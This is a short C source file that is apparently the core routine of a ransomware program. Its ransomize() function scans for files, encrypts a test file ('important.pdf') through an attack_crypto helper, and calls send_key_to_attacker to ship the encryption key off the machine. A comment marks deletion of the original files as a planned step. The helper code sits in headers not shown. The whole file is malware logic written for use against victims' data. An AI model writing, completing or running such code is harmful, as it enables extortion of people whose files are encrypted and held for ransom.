#include "attack.h"
#include "attack_crypto.h"
#include "get_relative_path.h"
#include "attack_web.h"
#include "read_files.h"
#include <stdio.h>

int ransomize(void)
{
    /* Target files, save paths in an array */
    size_t count = 0;
    char **paths = find_paths(&count);

    if (!paths) {
        printf("Failed to scan files.\n");
        return 1;
    }
    
    // printf("Found %zu files:\n\n", count);
    // for (size_t i = 0; i < count; i++) {
    //     printf("%s\n", paths[i]);
    // }

    /* Cleanup */
    for (size_t i = 0; i < count; i++) {
        free(paths[i]);
    }
    free(paths);

    /*For testing purposes, only get important.pdf*/
    char important[MAX_PATH];
    if (get_relative_path(important, sizeof(important), "important.pdf") != 0) {
        return 1;
    }

    /* Generate key, encrypt files and key */
    attack_crypto(important);
    
    crypto_cleanup();

    /* Delete original files */
    
    /* Handle remote actions */
    char aes_key_path[MAX_PATH];
    if (get_relative_path(aes_key_path, sizeof(aes_key_path), "aes_key.bin") == 0) {
        send_key_to_attacker(aes_key_path);
    }

    /* Cleanup */

    return 0;
}
